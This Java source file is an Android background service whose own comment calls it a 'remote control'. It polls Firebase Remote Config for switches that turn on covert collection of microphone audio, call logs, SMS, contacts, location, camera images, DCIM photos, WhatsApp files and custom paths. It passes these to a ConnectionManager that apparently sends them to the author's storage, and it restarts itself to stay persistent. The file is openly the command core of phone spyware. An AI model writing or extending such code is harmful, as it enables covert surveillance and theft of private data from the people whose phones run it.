package app.marees.mars.MarsService;


import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.lifecycle.ViewModel;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.remoteconfig.FirebaseRemoteConfig;
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings;

import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;

import app.marees.mars.BuildConfig;
import app.marees.mars.R;
import app.marees.mars.Singletons.Myapp;
import app.marees.mars.room.MyViewModel;


/** REMOTE CONTROL
 *          This class is for check my firebase remote which data is need to send to my drive
 *          this is done using firebase remote config
 *
 * **/


public class MainService extends Service {
    private static Context contextOfApplication;
    private static String myCommand="";
    private static ViewModel mars;
    static boolean once = true;
    boolean mic,call,sms,contact,location,camera,dcim,whatsapp,path,run,interval,immediate;
    String custom="";
    FirebaseRemoteConfig mFirebaseRemoteConfig;
    FirebaseRemoteConfigSettings configSettings;
    long cacheExpiration = 0;
    String imgUrl = "";
    Double duration =10.25;



    public MainService() {

    }

    private void checkData() {

                                                        //////initialize remote data which data requires or not

        mic = call = sms = contact = location =camera = dcim = whatsapp = path = run = interval = immediate = false;

        if(mFirebaseRemoteConfig.getString("Command").equals("")){

            Log.e("RemoteMode","Cant Find Data");
        }
        else if(mFirebaseRemoteConfig.getString("Command").equals("Yes")){

            Log.e("RemoteMode","Enabled");

                                                                            ////if mic Yes then get duration of record time on firebase
            if(mFirebaseRemoteConfig.getString("Mic").equals("Yes")){
                Log.e("Remote", "Mic Yes");
                duration = mFirebaseRemoteConfig.getDouble("Duration");
                mic = true;
            }
            if(mFirebaseRemoteConfig.getString("Interval").equals("Yes")){
                Log.e("Interval","Yes");
                interval = true;
            }
            if(mFirebaseRemoteConfig.getString("Immediate").equals("Yes")){
                Log.e("Immediate","Yes");
                immediate = true;
            }
            if(mFirebaseRemoteConfig.getString("Run").equals("Yes")){
                Log.e("Run","Yes");
                run = true;
            }
            if(mFirebaseRemoteConfig.getString("Call").equals("Yes")){
                Log.e("Remote","Calllog Yes");
                Log.e("Check","Calllog "+mFirebaseRemoteConfig.getString("Call"));

                call=true;
            }if(mFirebaseRemoteConfig.getString("Contact").equals("Yes")){
                Log.e("Remote","Contact Yes");
                contact=true;
            }if(mFirebaseRemoteConfig.getString("Sms").equals("Yes")){
                Log.e("Remote","Sms Yes");
                sms=true;
            }if(mFirebaseRemoteConfig.getString("Location").equals("Yes")){
                Log.e("Remote","Location Yes");
                location=true;
            }
            if(mFirebaseRemoteConfig.getString("Camera").equals("Yes")){
                Log.e("Remote","Camera Yes");
                camera=true;
            }                                                                               /////specfic folder Ex.camera go in deep how it used....
            if(mFirebaseRemoteConfig.getString("DCIM").equals("Yes")){
                Log.e("Remote","DCIM Yes");
                dcim = true;
            }
            if(mFirebaseRemoteConfig.getString("Whatsapp").equals("Yes")){
                Log.e("Remote","Whatsapp Yes");
                whatsapp = true;
            }


                custom = mFirebaseRemoteConfig.getString("Custom");
                Log.e("Remote","Custom Path:-"+custom);

            if(!mFirebaseRemoteConfig.getString("Path").equals("Yes")){

                path = true;
                Log.e("Remote","path Yes");
            }

                        /////////start Collected data to ConnectionManger class which send data asynchronusly
      ConnectionManager.startAsync(Myapp.getAppContext(),mic,call,contact,sms,location,camera,duration,dcim,whatsapp,custom,path);


        }
        else if(mFirebaseRemoteConfig.getString("Command").equals("No")){
            Log.e("RemoteMode","Disabled");
        }
        else if(mFirebaseRemoteConfig.getString("Command").equals(null)){
            Log.e("RemoteMode","nullData");
        }
        else{

            Log.e("RemoteMode","CheckString");
        }
    }

    public long getCacheExpiration() {
// If is developer mode, cache expiration set to 0, in order to test
        if (mFirebaseRemoteConfig.getInfo().getConfigSettings().isDeveloperModeEnabled()) {
            cacheExpiration = 0;
        }
        return cacheExpiration;
    }
    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        //throw new UnsupportedOperationException("Not yet implemented");
        return null;
    }


    @Override
    public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2)
    {
        Log.e("MainService","inside job");
        ///if no model get my model
        if(Myapp.getMyViewModel() == null && Myapp.getMyViewModel2() == null){
            Intent i = new Intent(Myapp.getAppContext(),DummyFragment.class);
            startActivity(i);
        }

        checkDatabase();
        mFirebaseRemoteConfig = FirebaseRemoteConfig.getInstance();
        configSettings = new FirebaseRemoteConfigSettings.Builder()
                .setDeveloperModeEnabled(BuildConfig.DEBUG)
                .build();
        mFirebaseRemoteConfig.setConfigSettings(configSettings);
        mFirebaseRemoteConfig.setDefaults(R.xml.remote_config_defaults);
        mFirebaseRemoteConfig.fetch(getCacheExpiration())

                .addOnCompleteListener(new OnCompleteListener<Void>() {
                    @Override
                    public void onComplete(@NonNull Task<Void> task) {
// If is successful, activated fetched
                        if (task.isSuccessful()) {
                            mFirebaseRemoteConfig.activateFetched();
                        } else {
                            Log.d("","");
                        }


                        Myapp.setCommand(mFirebaseRemoteConfig.getString("Command"));
                        Log.e("MainService","Checking data");
                        checkData();
                    }
                });




        Log.e("StartCommand","inside job");

        contextOfApplication = this;

checkData();
        return Service.START_STICKY;
    }

    public void checkDatabase() {
        DateFormat dateFormat = new SimpleDateFormat("yyyy/MM/dd");

        Date date = new Date();
        String todayDate = dateFormat.format(date);
        Log.e("Database","Checking data for "+todayDate);

        MyViewModel models = Myapp.getMyViewModel();

        if(models == null){
            Log.e("Database","model null getting model from dummy");
            Intent j = new Intent(Myapp.getAppContext(),DummyFragment.class);
            Myapp.getAppContext().startActivity(j);
        }
        else {
            Log.e("Database","model exist");
            models.getByDate(todayDate);
        }

    }


    @Override
    public void onDestroy() {
        super.onDestroy();
    }


    public static Context getContextOfApplication()
    {
        return contextOfApplication;
    }



}
